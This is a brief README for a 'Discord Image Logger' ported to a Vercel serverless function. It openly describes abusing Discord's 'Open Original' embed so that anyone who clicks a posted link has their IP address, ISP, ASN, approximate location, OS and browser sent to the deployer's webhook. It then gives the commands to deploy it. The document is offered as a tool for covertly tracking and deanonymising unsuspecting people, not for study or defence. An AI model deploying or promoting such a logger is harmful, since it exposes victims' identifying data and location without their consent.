# lschool
L SCHOOL
# Discord Image Logger (Vercel)

Port of [DeKrypt's Discord Image Logger](https://github.com/dekrypted/Discord-Image-Logger) to a Vercel serverless function.

Abuses Discord's "Open Original" embed behavior: when a link is posted it shows a broken-image preview, and when someone clicks it you get their IP, ISP, ASN, approximate location, OS and browser in a webhook.

## Deploy

```bash
npm i -g vercel
vercel --prod
